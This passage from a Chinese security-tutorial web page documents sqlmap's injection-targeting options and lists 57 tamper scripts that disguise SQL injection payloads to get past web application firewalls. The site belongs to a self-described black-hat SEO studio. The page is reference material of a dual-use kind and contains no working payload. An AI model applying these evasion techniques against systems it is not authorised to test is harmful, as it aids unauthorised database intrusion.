+<h3 id="_8">指定注入</h3>
+<p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p>
+<pre><code class="language-cmd">-p TESTPARAMETER    可测试的参数    
+--skip=SKIP         跳过对给定参数的测试    
+--skip-static       跳过测试不显示为动态的参数    
+--param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）   
+--dbms=DBMS         强制后端的DBMS为此值    
+--dbms-cred=DBMS..  DBMS认证凭证(user:password)    
+--os=OS            强制后端的DBMS操作系统为这个值    
+--invalid-bignum    使用大数字使值无效    
+--invalid-logical   使用逻辑操作使值无效   
+--invalid-string    使用随机字符串使值无效    
+--no-cast          关闭有效载荷铸造机制    
+--no-escape         关闭字符串逃逸机制    
+--prefix=PREFIX     注入payload字符串前缀  
+--suffix=SUFFIX     注入payload字符串后缀    
+--tamper=TAMPER   使用给定的脚本篡改注入数据
+</code></pre>
+<h2 id="tamper">Tamper功能</h2>
+<pre><code class="language-cmd">序号    脚本名称    注释  
+1    0x2char    将每个编码后的字符转换为等价表达  
+2    apostrophemask    单引号替换为Utf8字符  
+3    apostrophenullencode    替换双引号为%00%27  
+4    appendnullbyte    有效代码后添加%00  
+5    base64encode    使用base64编码  
+6    between    比较符替换为between  
+7    bluecoat    空格替换为随机空白字符，等号替换为like  
+8    chardoubleencode    双url编码  
+9    charencode    将url编码  
+10    charunicodeencode    使用unicode编码  
+11    charunicodeescape    以指定的payload反向编码未编码的字符 
+12    commalesslimit    改变limit语句的写法  
+13    commalessmid    改变mid语句的写法  
+14    commentbeforeparentheses    在括号前加内联注释  
+15    concat2concatws    替换CONCAT为CONCAT_WS  
+16    equaltolike    等号替换为like  
+17    escapequotes    双引号替换为\\\\  
+18    greatest    大于号替换为greatest  
+19    halfversionedmorekeywords    在每个关键字前加注释  
+20    htmlencode    html编码所有非字母和数字的字符  
+21    ifnull2casewhenisnull    改变ifnull语句的写法  
+22    ifnull2ifisnull    替换ifnull为if(isnull(A))  
+23    informationschemacomment    标示符后添加注释  
+24    least    替换大于号为least  
+25    lowercase    全部替换为小写值  
+26    modsecurityversioned    空格替换为查询版本的注释  
+27    modsecurityzeroversioned    添加完整的查询版本的注释  
+28    multiplespaces    添加多个空格  
+29    nonrecursivereplacement    替换预定义的关键字  
+30    overlongutf8    将所有字符转义为utf8  
+31    overlongutf8more    以指定的payload转换所有字符  
+32    percentage    每个字符前添加%  
+33    plus2concat    将加号替换为concat函数  
+34    plus2fnconcat    将加号替换为ODBC函数{fn CONCAT()}  
+35    randomcase    字符大小写随机替换  
+36    randomcomments    /**/分割关键字  
+37    securesphere    添加某字符串  
+38    sp_password    追加sp_password字符串  
+39    space2comment    空格替换为/**/  
+40    space2dash    空格替换为–加随机字符  
+41    space2hash    空格替换为#加随机字符  
+42    space2morecomment    空格替换为/**_**/  
+43    space2morehash    空格替换为#加随机字符及换行符  
+44    space2mssqlblank    空格替换为其他空符号  
+45    space2mssqlhash    空格替换为%23%0A  
+46    space2mysqlblank    空格替换为其他空白符号  
+47    space2mysqldash    空格替换为–%0A  
+48    space2plus    空格替换为加号  
+49    space2randomblank    空格替换为备选字符集中的随机字符  
+50    symboliclogical    AND和OR替换为&amp;&amp;和||  
+51    unionalltounion    union all select替换为union select 
+52    unmagicquotes    宽字符绕过GPC  
+53    uppercase    全部替换为大写值  
+54    varnish    添加HTTP头  
+55    versionedkeywords    用注释封装每个非函数的关键字  
+56    versionedmorekeywords    使用注释绕过  
+57    xforwardedfor    添加伪造的HTTP头  
+</code></pre></div></article><nav class="pager"><a class="pg prev" href="../mysql-database-injection/"><span>上一篇</span><b>MYSQL数据库注入</b></a><a class="pg next" href="../xss-cross-site-scripting/"><span>下一篇</span><b>xss跨站脚本攻击</b></a></nav>
+        <footer class="site-foot">
+      <p><b>烟雨黑帽SEO工作室</b> · <a href="https://www.heimaoseo.com" rel="noopener">www.heimaoseo.com</a></p>
+      <p>微信：yanyuseo ｜ QQ：81047380 ｜ 邮箱：<a href="mailto:yanyuseo@gmail.com">yanyuseo@gmail.com</a></p>
+      <p>专注搜索引擎优化（SEO）与黑帽SEO技术研究，涵盖整站优化、站群、蜘蛛池、泛目录、快排与流量变现等实战方向，并提供 Web 渗透测试、内网渗透、代码审计等网络安全技术交流。</p>
+      <p class="muted">本站内容仅供安全学习与技术研究，请勿用于非法用途。</p>
+    </footer>
+  </main>
+</div>
+<script src="../assets/app.js?v=1"></script>
+</body>
+</html>
